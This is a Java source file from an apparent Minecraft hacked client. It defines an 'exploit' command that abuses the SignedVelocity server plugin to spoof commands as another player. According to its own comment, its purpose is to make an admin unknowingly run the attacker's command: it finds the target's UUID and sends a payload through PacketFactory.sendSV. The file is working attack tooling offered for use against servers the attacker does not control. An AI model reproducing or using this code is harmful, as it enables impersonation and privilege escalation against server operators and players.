package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.client.multiplayer.PlayerInfo;
import net.minecraft.commands.SharedSuggestionProvider;
import net.paradise_client.*;
import net.paradise_client.command.Command;
import net.paradise_client.command.CommandManager;

/**
 * SignedVelocity exploit to force an admin to run the exploiter's command, after the payload has been sent, next
 * command run by the target will be replaced by the current one
 */
public class SignedVelocityCommand extends Command {
  public SignedVelocityCommand() {
    super("signedvelocity", "Spoofs player sent commands", CommandManager.CommandCategory.EXPLOIT);
  }

  @Override public void build(LiteralArgumentBuilder<SharedSuggestionProvider> root) {
    root.executes(this::incompleteCommand)
      .then(argument("user", StringArgumentType.word()).suggests(this::suggestOnlinePlayers)
        .executes(this::incompleteCommand)
        .then(argument("command", StringArgumentType.greedyString()).executes(context -> {
          String user = context.getArgument("user", String.class);
          for (PlayerInfo p : getMinecraftClient().getConnection().getOnlinePlayers()) {
            if (p.getProfile().name().equalsIgnoreCase(user)) {
              String uuid = p.getProfile().id().toString();
              String command = context.getArgument("command", String.class);
              PacketFactory.sendSV(uuid, command);
              Helper.printChatMessage("Payload sent!");
              return SINGLE_SUCCESS;
            }
          }

          Helper.printChatMessage("Player not found!");
          return SINGLE_SUCCESS;
        })));
  }
}
